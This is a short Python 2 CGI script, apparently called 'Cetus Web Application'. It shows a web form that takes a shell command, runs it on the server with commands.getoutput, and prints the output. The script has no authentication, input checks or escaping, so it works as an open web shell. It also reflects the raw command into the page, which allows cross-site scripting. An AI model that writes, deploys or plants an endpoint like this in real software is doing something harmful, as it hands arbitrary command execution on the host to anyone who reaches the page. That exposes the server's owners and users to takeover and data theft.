#!/usr/bin/python
import cgi, string, sys, os, re, random, subprocess, commands
import cgitb; cgitb.enable()  # for troubleshooting

import glob
import shutil



# Required header that tells the browser how to render the HTML.
print("Content-Type: text/html\n\n")
print """

<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<title>Cetus</title>
<style>
<!--
@charset "utf-8";
body {
background-color: #DEDECA;
}

body, td, th {
color: #666633;
}

h1, h2 {
color: #663300;
}

h3, h4, h5, h6 {
color: #996633;
}

a {
color: #996633;
}

.container {
width: 80%;
max-width: 1260px;
min-width: 780px;
background: #FFF;
margin: 0 auto;
}

.header {
background: #6F7D94;
}

.sidebar1 {
float: right;
width: 25%;
background: #background: #666633;;
padding-bottom: 10px;
}
.content {
padding: 10px 0;
width: 70%;
float: right;
}

.content ul, .content ol { 
padding: 0 15px 15px 40px; 
}

ul.nav {
list-style: none;
border-top: 1px solid #666;
margin-bottom: 15px; 
}
ul.nav li {
border-bottom: 1px solid #666; 
}
ul.nav a, ul.nav a:visited { 
padding: 5px 5px 5px 15px;
display: block;
text-decoration: none;
background: #c0b895;
color: #663300;
}
ul.nav a:hover, ul.nav a:active, ul.nav a:focus { 
background: #996633;
color: #FFF;
}

.header {
padding: 5px 0;
background: #c0b895;
}

.footer {
background: #c0b895;
position: relative;
clear: both; 
}


.fltrt { 
float: right;
margin-left: 8px;
}
.fltlft { 
float: left;
margin-right: 8px;
}
.clearfloat { 
clear:both;
height:0;
font-size: 1px;
line-height: 0px;
}
-->

</style></head>
<div class="container">
<div class="header">
<h1 align="center">Cetus Web Application</h1>
</div>
"""


def command_input():
    html = """
<FORM ACTION="command.cgi" METHOD="POST" enctype="multipart/form-data">
  command : <input type="text" name="command_in" />
  <input type="submit" value="Submit" />
  <input type="hidden" name="action" value="command_output">
</form>



    """
    print(html)

def command_output(form):
    command_in = form['command_in'].value
    print(command_in)
    
    html = """
<FORM ACTION="command.cgi" METHOD="POST" enctype="multipart/form-data">
  command : <input type="text" name="command_in" />
  <input type="submit" value="Submit" />
  <input type="hidden" name="action" value="command_output">
</form>



    """
    print(html)
    print('<h3>runing command: '+command_in+'</h3><br>')
    output = commands.getoutput(command_in)
    print output.replace('\n','<br>')
    print('</html>')
    
# Define main function.
def main():
#try:
    form = cgi.FieldStorage()
    if "action" in form:
        action=form["action"].value

        if action == "command_output":
            command_output(form)

        else:
            command_input()
    else:
        command_input()
#except:
#    login_form()
#    print("Unexpected error:", sys.exc_info()[0])

# Call main function.
main()




